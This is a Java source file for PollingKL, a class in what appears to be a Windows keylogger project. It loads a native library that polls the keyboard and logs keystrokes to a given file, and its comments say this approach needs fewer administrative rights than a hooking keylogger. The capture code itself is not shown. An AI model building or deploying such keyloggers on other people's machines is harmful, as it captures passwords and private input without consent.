package com.wassilak.win_kl.kl;

import java.io.File;
import java.io.IOException;

/**
 * The PollingKL class is an implementation of the KL interface that uses
 * constant polling to capture keystrokes. This is not a very efficient method,
 * however it potentially needs less administrative rights than other methods,
 * for instance, a hooking key logger.
 */
public class PollingKL implements KL {

    /**
     * The LIB_NAME constant contains the name of the native library. It is
     * broken out as a constant because it contains the project version.
     */
    public static final String LIB_NAME = "win-kl-native-1.0";

    /**
     * The static initializer loads the library containing the native
     * functionality.
     */
    static {
        System.loadLibrary(LIB_NAME);
    }

    /**
     * The nativeRun method declaration defines functionality implemented in the
     * loaded native library that polls the keyboard, logging key strokes in the
     * given log file location.
     *
     * @param logFile The file location to log keystrokes to.
     */
    private native void nativeRun(String logFile);

    /**
     * The run method implements the run method of the KL interface.
     *
     * @param logFile The file that the key-logger should log keys to.
     */
    public void run(File logFile) {
        try {
            this.nativeRun(logFile.getCanonicalPath());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
